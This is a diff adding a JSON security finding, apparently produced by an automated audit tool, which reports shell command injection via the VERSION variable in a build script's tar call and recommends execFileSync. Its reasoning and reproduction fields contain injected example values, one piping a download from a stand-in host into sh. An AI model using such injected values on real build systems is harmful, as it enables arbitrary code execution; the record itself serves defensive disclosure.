@@ -1,0 +1,39 @@
+{
+  "schemaVersion": 1,
+  "findingId": "fnd_sig-feat-library-710c9f5545-05e3_194220d8b1",
+  "featureId": "feat_library_710c9f5545",
+  "title": "Shell command injection via VERSION env var in tar invocation",
+  "category": "security",
+  "severity": "medium",
+  "confidence": "high",
+  "triage": "confirmed-bug",
+  "evidence": [
+    {
+      "path": "scripts/build-bundle.ts",
+      "startLine": 33,
+      "endLine": 33,
+      "symbol": "version",
+      "quote": null
+    },
+    {
+      "path": "scripts/build-bundle.ts",
+      "startLine": 62,
+      "endLine": 68,
+      "symbol": null,
+      "quote": null
+    }
+  ],
+  "reasoning": "The VERSION environment variable (line 33) is interpolated into tarballName (line 62) which is then passed to execSync as a shell string (line 66). execSync spawns a shell, so any shell metacharacters in VERSION (semicolons, backticks, $(), pipes) will be interpreted. In CI, VERSION is typically derived from a git tag (per the comment on lines 31-32). A malicious or compromised git tag like v1.0.0$(curl evil.com/x|sh) would achieve arbitrary command execution during the build. The platform/arch values on line 37 are safe (Node.js constants), but version is externally influenced.",
+  "reproduction": "VERSION='1.0.0; touch /tmp/pwned' bun run scripts/build-bundle.ts",
+  "recommendation": "Replace execSync string interpolation with execFileSync('tar', ['-czf', tarballName, '-C', stageDir, 'dist', 'lib'], { cwd: repoRoot, stdio: 'inherit' }) to avoid shell interpretation. Alternatively, validate VERSION against a strict semver regex before use.",
+  "whyTestsDoNotAlreadyCoverThis": "No tests are included for this feature, and build scripts are typically not unit-tested. The injection requires a crafted VERSION value that would not appear in normal CI runs.",
+  "suggestedRegressionTest": "Add a unit test or integration check that calls the tar logic with VERSION containing shell metacharacters (e.g., '1.0.0;echo pwned') and asserts no extra file is created / the command fails safely.",
+  "minimumFixScope": "Replace execSync on line 65-68 with execFileSync using an argument array, eliminating the shell entirely.",
+  "status": "open",
+  "history": [],
+  "signature": "sig_feat-library-710c9f5545_05e332f91c",
+  "linkedPatchAttemptIds": [],
+  "createdByRunId": "20260720T051243-181602",
+  "createdAt": "2026-07-20T05:15:18.626Z",
+  "updatedAt": "2026-07-20T05:15:18.626Z"
+}
